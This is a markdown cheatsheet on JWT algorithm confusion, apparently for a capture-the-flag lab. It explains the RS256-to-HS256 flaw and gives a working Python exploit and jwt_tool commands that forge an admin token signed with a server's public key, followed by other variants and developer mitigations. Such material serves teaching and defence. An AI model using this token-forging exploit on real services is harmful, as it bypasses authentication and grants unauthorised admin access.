# Cheatsheet — JWT Algorithm Confusion

## What is it?

JWT tokens have three parts: `header.payload.signature`.
The header specifies the algorithm (`alg`).  If the server trusts the `alg`
field from the (unverified) token to choose how to verify the signature, an
attacker can switch from `RS256` (asymmetric) to `HS256` (symmetric) and sign
the token using the **RSA public key** as the HMAC secret — the server will
use that same key to verify it.

```
RS256: signature = RSA_sign(private, data)   verify = RSA_verify(public, data)
HS256: signature = HMAC(secret, data)        verify = HMAC(secret, data) == sig
```

If the server's HS256 secret IS the public key → the attacker can sign freely.

---

## Attack flow

```
1. GET /api/public-key       →  obtain the RSA public key PEM
2. Forge JWT  alg=HS256      →  payload.role = "admin"
3. Sign with public_key_pem  →  used as the HMAC-SHA256 secret
4. Send to protected endpoint  →  Authorization: Bearer <token>
```

---

## Minimal exploit (Python)

```python
import jwt, requests

BASE = "http://target"

pub = requests.get(f"{BASE}/api/public-key").text.strip()

token = jwt.encode(
    {"username": "attacker", "role": "admin"},
    pub,               # PEM string used as HMAC secret
    algorithm="HS256",
)

r = requests.get(f"{BASE}/api/flag",
                 headers={"Authorization": f"Bearer {token}"})
print(r.json())
```

---

## Manual exploit with jwt_tool

```bash
pip install jwt_tool
curl http://target/api/public-key -o pub.pem

# Algorithm confusion — public key as HMAC secret
python3 jwt_tool.py <LEGITIMATE_TOKEN> -X k -pk pub.pem
```

---

## Decode a token without verifying (quick debug)

```bash
# Bash: base64-decode the payload (part 2)
echo "<PAYLOAD_B64>" | base64 -d 2>/dev/null | python3 -m json.tool

# Python
import jwt
print(jwt.decode(token, options={"verify_signature": False}))
```

---

## Vulnerability variants

| Variant | Description |
|---|---|
| `alg: none` | Server accepts unsigned tokens |
| RS256 → HS256 | Public key reused as HMAC secret |
| Key confusion | Server accepts keys from arbitrary JWKS |
| `kid` injection | SQL / path traversal via the `kid` header field |

---

## Mitigations (for developers)

- **Hardcode the allowed algorithm** — never read it from the token:
  ```python
  jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])  # hardcoded
  ```
- Keep the `algorithms` list as a strict whitelist.
- Always reject `alg: none`.
- Use separate secrets — never reuse the public key as the HMAC secret.
- Reference: [JWT Security Best Practices — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
